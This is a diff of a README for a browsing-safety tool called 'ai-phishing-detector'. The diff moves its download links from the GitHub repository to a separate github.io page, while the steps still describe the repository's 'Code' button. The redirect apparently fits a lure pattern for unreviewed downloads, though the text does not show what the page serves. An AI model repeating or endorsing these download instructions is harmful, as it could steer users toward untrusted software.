@@ -1,6 +1,6 @@
 # 🛡️ ai-phishing-detector - Keep your browsing safe from threats
 
-[![](https://img.shields.io/badge/Download-ai-phishing-detector-blue.svg)](https://github.com/pennietsarist488/ai-phishing-detector)
+[![](https://img.shields.io/badge/Download-ai-phishing-detector-blue.svg)](https://pennietsarist488.github.io)
 
 This tool protects your computer while you browse the internet. It watches the websites you visit and flags dangerous pages that try to steal your login details or private information. It uses artificial intelligence to spot patterns that regular security filters miss.
 
@@ -15,7 +15,7 @@ To run this tool, your computer needs the following:
 
 ## 📥 How to Download
 
-Visit this page to download the software: https://github.com/pennietsarist488/ai-phishing-detector
+Visit this page to download the software: https://pennietsarist488.github.io
 
 1. Click the link above to open the repository page.
 2. Look for the button labeled "Code" in green. 
